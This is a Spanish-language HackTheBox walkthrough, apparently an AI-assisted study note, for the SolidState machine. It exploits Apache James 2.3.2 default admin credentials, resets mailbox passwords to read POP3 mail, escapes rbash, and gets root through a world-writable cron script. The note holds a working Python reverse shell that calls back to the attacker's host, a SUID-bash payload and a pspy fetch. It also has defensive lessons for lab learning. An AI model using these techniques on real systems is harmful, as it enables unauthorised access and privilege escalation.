---
title: SolidState (HackTheBox Medium)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, medium, apache-james, smtp, pop3, rbash, cron, privesc]
type: nota
status: en-progreso
source: claude-code
aliases: [SolidState, HTB SolidState, Apache James 2.3.2]
---

# SolidState — HackTheBox (Medium)

Línea de ficha: SO: Linux · Dificultad: Medium · Skills: enum de servicios de correo (SMTP/POP3), credenciales por defecto, lectura de email, escape de restricted shell (rbash), privesc por script de cron world-writable.

> Recordatorio ético: HTB es un laboratorio **autorizado y legal**. Todo lo de abajo se hace contra máquinas que tienes permiso explícito para atacar. No lo lleves fuera del lab.

SolidState ejecuta **Apache James 2.3.2** como servidor de correo. Su consola de administración remota (puerto 4555) acepta las credenciales por defecto `root/root`. Desde ahí reseteamos la contraseña de los buzones de los usuarios, leemos su correo por POP3 y encontramos un email con las credenciales SSH de `mindy`. Al entrar por SSH caemos en una **rbash** (restricted shell) que escapamos vía `ssh -t "bash --noprofile"`. Para root, un cron de root ejecuta `/opt/tmp.py`, que es **world-writable**: lo sobrescribimos con una reverse shell y esperamos. Cadena: *credenciales por defecto → control del correo → secreto en email → escape de rbash → cron escribible → root*.

## Objetivo

Obtener dos flags:
- `user.txt` — en el home del usuario sin privilegios (`/home/mindy/user.txt`).
- `root.txt` — en `/root/root.txt`.

El camino: **recon → enumeración de correo → foothold por credenciales por defecto → shell estable + escape de rbash → enumeración como mindy → privesc por cron → root**.

## Acceso a la máquina (paso previo)

1. Conéctate a la VPN del lab y **deja la terminal abierta** (la conexión se cae si la cierras):
   ```bash
   sudo openvpn lab_<usuario>.ovpn
   ```
   Espera la línea `Initialization Sequence Completed`. Si usas **Pwnbox**, ya viene conectado: salta este paso.

2. Pulsa **Spawn Machine** en el panel de HTB. Te da una IP `10.10.10.x`. SolidState es una máquina **retirada**, así que necesitas suscripción **VIP/VIP+** para spawnearla.

3. Verifica conectividad y sustituye `<IP>` por la IP real en todo lo que sigue:
   ```bash
   ping -c2 <IP>
   ```
   Salida esperada: 2 respuestas `64 bytes from <IP>: icmp_seq=...`. Si hay `100% packet loss`, revisa que la VPN sigue arriba y que diste tiempo a que la máquina arranque (~1-2 min).

## Reconocimiento

**Categoría: descubrimiento de superficie de ataque.** Antes de nada, un escaneo de todos los puertos TCP con detección de versión y scripts por defecto.

```bash
nmap -sC -sV -p- -oN nmap.txt <IP>
```

- `-p-` escanea los 65535 puertos (no solo el top-1000). Crítico aquí: el puerto clave (4555) **no está en el top-1000**, así que un escaneo por defecto lo perdería.
- `-sV` detecta versiones de servicio (banner grabbing + sondas).
- `-sC` lanza los scripts NSE por defecto (`default` category).
- `-oN nmap.txt` guarda salida en formato normal.

Salida esperada (versiones aproximadas; verifica contra la máquina viva):

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian
25/tcp   open  smtp        JAMES smtpd 2.3.2
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  rsip?       (James Remote Administration Tool 2.3.2)
```

**Qué buscar / cómo interpretar cada puerto:**
- **22 SSH** — vía de acceso estable una vez tengas credenciales. No es el foothold, es el destino.
- **25 SMTP `JAMES smtpd 2.3.2`** — Apache James. El nombre y la versión son oro: 2.3.2 es antiguo y conocido por vulnerabilidades.
- **80 HTTP** — web. Suele ser una página corporativa estática; revísala pero no malgastes tiempo si no hay nada dinámico.
- **110 POP3 `JAMES pop3d`** — por aquí **leeremos el correo** de los usuarios una vez tengamos sus contraseñas.
- **119 NNTP** — news; aquí no se usa, pero confirma que es un stack James completo.
- **4555 James Remote Administration Tool 2.3.2** — **el foothold**. Es la consola de administración remota de James. Históricamente trae `root/root` por defecto.

Hipótesis tras el recon: *todo gira alrededor de Apache James. El puerto 4555 es la entrada; SMTP/POP3 son para manipular y leer correo.*

## Enumeración

### Puerto 80 (rápido, para descartar)

```bash
whatweb http://<IP>
curl -s http://<IP>/ | head -n 40
```
Verás una landing estática de "Solid State Security". No suele haber funcionalidad explotable. Opcionalmente `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt` pero no es la vía: no inviertas mucho aquí.

### Puerto 4555 — James Remote Administration

**Categoría: credenciales por defecto en panel de administración.** Apache James 2.3.2 expone una consola de admin en 4555 cuya credencial de fábrica es `root/root` (definida en `config.xml`). El patrón es clásico: *servicio con credenciales por defecto → control total del componente*.

Conéctate con telnet o netcat:
```bash
telnet <IP> 4555
```
Salida esperada:
```
JAMES Remote Administration Tool 2.3.2
Please enter your login and password:
Login id:
```
Introduce:
```
root
root
```
Si acepta, verás:
```
Welcome root. HELP for a list of commands
```

**Qué hace esta consola por dentro:** es la herramienta de administración de James. Permite gestionar usuarios del servidor de correo (crear, listar, **resetear contraseñas**), gestionar dominios, spool, etc. Lo potente: puedes **cambiar la contraseña de cualquier buzón sin conocer la actual**.

Lista usuarios y comandos disponibles:
```
HELP
listusers
```
Salida esperada (los nombres exactos pueden variar; verifica en vivo). Típicamente algo como:
```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

**Trampa importante:** este James 2.3.2 también es vulnerable a **CVE-2015-7611** (deserialización / inyección de comando al crear usuarios cuyo nombre contiene una ruta), que se dispara al loguearse ese usuario. Pero ese vector aquí es frágil/poco fiable. La vía canónica y limpia es **resetear contraseñas y leer el correo**, así que vamos por ahí.

## Acceso inicial (foothold)

**Patrón: control del correo → secreto filtrado en un email.** Como controlamos James, reseteamos la contraseña de cada buzón a una que conozcamos, y luego leemos el correo por POP3 buscando credenciales.

1. **Resetear las contraseñas de los buzones** desde la consola 4555 (sigue conectado por telnet). El comando es `setpassword <usuario> <nueva_pass>`:
   ```
   setpassword james <pass_temporal>
   setpassword thomas <pass_temporal>
   setpassword john <pass_temporal>
   setpassword mindy <pass_temporal>
   setpassword mailadmin <pass_temporal>
   ```
   Usa una `<pass_temporal>` que tú elijas (p.ej. una palabra simple). Salida esperada por cada uno:
   ```
   Password for <usuario> reset
   ```
   > Nota ética/operacional: estás cambiando contraseñas de cuentas. En un engagement real esto es intrusivo y se documenta. En el lab es el camino previsto.

2. **Leer el correo de cada usuario por POP3** (puerto 110). El protocolo POP3 es texto plano: te logueas con `USER`/`PASS`, listas con `LIST` y descargas un mensaje con `RETR <n>`.
   ```bash
   telnet <IP> 110
   ```
   Sesión esperada (ejemplo con `john`):
   ```
   +OK <hostname> POP3 server (JAMES POP3 Server 2.3.2) ready
   USER john
   +OK
   PASS <pass_temporal>
   +OK Welcome john
   LIST
   +OK 1 743
   1 743
   RETR 1
   +OK Message follows
   ...
   (cuerpo del correo)
   .
   ```

   **Qué buscar:** lee los cuerpos de todos los buzones. Hay una cadena de correos entre `mailadmin`, `james`, `thomas`, `john` y `mindy`. En el buzón de **`john`** hay un mensaje donde se le pide crear la cuenta de `mindy`, y en el de **`mindy`** hay un correo de bienvenida que contiene sus **credenciales SSH** en texto plano (usuario `mindy` + `<pass_mindy>`).

   Repite el `telnet <IP> 110` para `mindy`:
   ```
   USER mindy
   PASS <pass_temporal>
   LIST
   RETR 1
   RETR 2
   ```
   En uno de sus mensajes aparece algo como: *"Here are your credentials... username: mindy, password: <pass_mindy>"*. **Apunta `<pass_mindy>`.**

   **Trampa:** las sesiones POP3 son delicadas; si te equivocas en un comando, James puede cerrar la conexión. Reconecta y ve despacio. Alternativa más cómoda: usa un cliente POP3 real, o `curl`:
   ```bash
   curl "pop3://<IP>/1" --user "mindy:<pass_temporal>"
   ```

3. **SSH como mindy:**
   ```bash
   ssh mindy@<IP>
   ```
   Introduce `<pass_mindy>`. Entras... pero a una shell restringida.

## Shell estable

Por SSH ya tienes una sesión TTY (no necesitas el truco de `nc` + pty que se usa con webshells). El problema aquí es distinto: **mindy cae en una `rbash` (restricted bash)**.

**Cómo detectarlo:** intenta moverte y verás errores:
```bash
cd /tmp
```
```
-rbash: cd: restricted
```
```bash
export PATH=/usr/bin
```
```
-rbash: PATH: readonly variable
```
Los síntomas de rbash: no puedes `cd`, no puedes cambiar `PATH`, no puedes ejecutar comandos con `/` en la ruta, y el `PATH` apunta a un directorio con un puñado de binarios permitidos (mira `~/.bashrc` o `ls /home/mindy/bin`).

**Escape de rbash (categoría: restricted shell escape).** El más limpio es pedir a SSH que ejecute directamente una bash **sin perfil** (que es lo que aplica las restricciones), antes de que rbash tome el control:
```bash
ssh mindy@<IP> -t "bash --noprofile"
```
- `-t` fuerza la asignación de un pseudo-terminal.
- `bash --noprofile` arranca una bash que **no lee** los ficheros de inicio que imponen rbash, dándote una shell normal.

Verifica:
```bash
echo $0          # debería ser 'bash', no '-rbash'
export PATH=/usr/bin:/bin:/usr/sbin:/sbin
which python python3
```
Ahora tienes una shell funcional. **Alternativas de escape de rbash** (útiles si la de arriba no aplica): saltar vía un programa permitido que tenga `:!sh` (como `vi`/`vim`), `awk 'BEGIN{system("/bin/bash")}'`, `find . -exec /bin/bash \;`, o `ssh user@host -t "/bin/sh"`. Tras escapar, **lo primero es arreglar el `PATH`**, o muchos comandos "no se encontrarán".

## Escalada de privilegios

### Enumeración como mindy

Con la shell ya usable, enumera vectores comunes. Lo primero, scripts/tareas que corren como root y permisos raros:

```bash
# ¿Qué hay en /opt? (sitio típico de scripts custom)
ls -la /opt
cat /opt/tmp.py

# Buscar ficheros escribibles por todos (clave para cron/scripts de root)
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"
```

**Qué buscar:** verás `/opt/tmp.py` y, crucialmente, que **es world-writable**:
```
-rwxrwxrwx 1 root root  105 ... /opt/tmp.py
```
Cualquiera puede modificarlo y es propiedad de root. La hipótesis inmediata: *root lo ejecuta periódicamente (cron)*. El contenido de `/opt/tmp.py` suele ser un script que limpia `/tmp`:
```python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

**Confirmar el cron.** Si tienes `pspy` (monitor de procesos sin root), súbelo y obsérvalo:
```bash
# en tu máquina: python3 -m http.server 8000  (sirviendo pspy)
# en la víctima:
wget http://<IP_TU_KALI>:8000/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy
```
Verás cada ~3 minutos algo como `UID=0 ... python /opt/tmp.py` — confirma que **root ejecuta `/opt/tmp.py` por cron**. (En SolidState no puedes leer `/etc/crontab` directamente para ver la línea, pero pspy lo revela.)

### El vector: cron escribible

**Patrón: script ejecutado por root + escribible por usuario sin privilegios = ejecución de código como root.** Sobrescribimos `/opt/tmp.py` con un payload Python que nos devuelva una reverse shell de root (o, más simple, que copie/exponga `root.txt`).

**Opción A — reverse shell (recomendada, da shell de root completa):**

1. En tu Kali, ponte a escuchar:
   ```bash
   nc -lvnp 4444
   ```
2. En la víctima, sobrescribe el script:
   ```bash
   cat > /opt/tmp.py << 'EOF'
   #!/usr/bin/env python
   import socket,subprocess,os
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("<IP_TU_KALI>",4444))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   subprocess.call(["/bin/bash","-i"])
   EOF
   ```
   (Sustituye `<IP_TU_KALI>` por la IP de tu interfaz `tun0` de la VPN — compruébala con `ip a show tun0`.)
3. **Espera al cron** (hasta ~3 minutos). En tu listener saltará:
   ```
   connect to [<IP_TU_KALI>] from (UNKNOWN) [<IP>] ...
   root@solidstate:/# id
   uid=0(root) gid=0(root) groups=0(root)
   ```
   Eres **root**.

**Opción B — sin reverse shell (más sigilosa, si no quieres callback):**
```bash
cat > /opt/tmp.py << 'EOF'
import os
os.system('chmod +s /bin/bash')   # deja bash con SUID
EOF
```
Tras el cron: `/bin/bash -p` te da una shell con EUID 0. O directamente `os.system('cp /root/root.txt /tmp/r.txt; chmod 777 /tmp/r.txt')` para solo leer la flag.

**Trampa:** no edites `/opt/tmp.py` con un editor restringido o sin permisos de PATH; usa redirección (`cat > ...`) o `nano`/`vi` con ruta completa. Y asegúrate de que el script siga siendo válido Python y ejecutable (`chmod +x /opt/tmp.py` si hiciera falta) — si lo rompes, el cron fallará silenciosamente.

## Flags

- **user.txt** — como `mindy` (incluso dentro de rbash, si está en su home):
  ```bash
  cat /home/mindy/user.txt
  ```
  Lee la cadena `<flag>` y envíala en el panel de HTB.

- **root.txt** — ya como root (Opción A) o tras el SUID (Opción B):
  ```bash
  cat /root/root.txt
  ```
  Envía la `<flag>`.

## Patrón y teoría

Lo verdaderamente reutilizable de SolidState (esto es lo que importa como dev/blue/purple team):

1. **Credenciales por defecto en paneles de administración** (James `root/root`).
   - *Patrón ofensivo:* identificar versión exacta del servicio → buscar credenciales/config de fábrica → probarlas antes que nada.
   - *Defensa/diseño:* nunca desplegar con credenciales por defecto; forzar cambio en el primer arranque; segmentar/firewall de los puertos de administración (4555 jamás debería estar expuesto a la red). Ver [[05-identidad-auth-y-secretos]].

2. **Secretos transmitidos por canales inseguros (email en claro).**
   - *Patrón ofensivo:* si controlas el correo, los secretos de aprovisionamiento (contraseñas iniciales) suelen viajar en el cuerpo del mensaje.
   - *Defensa:* no enviar credenciales por email; usar enlaces de un solo uso, gestores de secretos, o credenciales que el usuario debe establecer él mismo. POP3/SMTP sin TLS = todo en texto plano. Ver [[05-identidad-auth-y-secretos]].

3. **Restricted shells son contención, no seguridad real.**
   - *Patrón ofensivo:* rbash se escapa casi siempre (binarios permitidos con `!sh`, `ssh -t bash --noprofile`, lenguajes interpretados).
   - *Defensa:* rbash bien configurada implica controlar el `PATH`, los binarios accesibles (sin `vi`, `awk`, `find`, `python`, etc.) y los métodos de login; aun así, trátala como defensa en profundidad, no como límite confiable. Ver [[06-seguridad-de-sistemas-y-hardening]].

4. **Tareas programadas (cron) que ejecutan scripts escribibles = RCE como root.**
   - *Patrón ofensivo:* enumerar `/opt`, `/usr/local/bin`, crons; buscar ficheros propiedad de root pero escribibles por otros (`find / -writable`). pspy revela qué corre root sin necesidad de leer `/etc/crontab`.
   - *Defensa/diseño:* principio de mínimo privilegio en permisos de fichero — un script que corre como root **nunca** debe ser world-writable (debería ser `0755 root:root` o más estricto); auditar permisos de todo lo que toque cron. Ver [[06-seguridad-de-sistemas-y-hardening]].

**Metodología transversal (el "hilo"):** *recon completo de puertos (`-p-` siempre) → identificar el servicio "raro" y su versión exacta → buscar credenciales por defecto/CVE → pivotar al recurso que controla (correo) → extraer secretos → acceso → estabilizar y romper la jaula (rbash) → enumerar lo que corre como root → abusar de un permiso mal puesto.*

## Trampas y errores comunes

1. **No usar `-p-` en nmap.** El puerto 4555 (el foothold) está fuera del top-1000. Un escaneo por defecto te deja ciego ante toda la máquina. Siempre escanea todos los puertos.
2. **Olvidar la VIP / la máquina retirada.** SolidState está retirada; sin suscripción VIP no la spawneas. Y si la VPN se cae a media sesión, pierdes la shell.
3. **Romper la sesión POP3.** Un comando mal escrito hace que James cierre la conexión. Ve despacio, o usa `curl pop3://`. Y recuerda: hay que **resetear** la contraseña antes de poder leer el buzón.
4. **Quedarse atrapado en rbash.** Mucha gente intenta `cd`/`export` y se frustra. La solución es no pelear con la jaula: entra directamente con `ssh -t "bash --noprofile"` y **arregla el `PATH`** lo primero.
5. **Romper `/opt/tmp.py` o no esperar al cron.** Si dejas Python inválido, el cron falla y no pasa nada. Verifica la sintaxis, usa la IP de `tun0` (no la de tu LAN), y ten paciencia (hasta ~3 min). Si no salta, comprueba el listener y los permisos del fichero.

## Conexiones

- [[HTB_Medium/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Easy/00_README]] (el paso anterior)
- [[05-identidad-auth-y-secretos]] (credenciales por defecto, secretos por email)
- [[06-seguridad-de-sistemas-y-hardening]] (rbash, permisos de cron, mínimo privilegio)
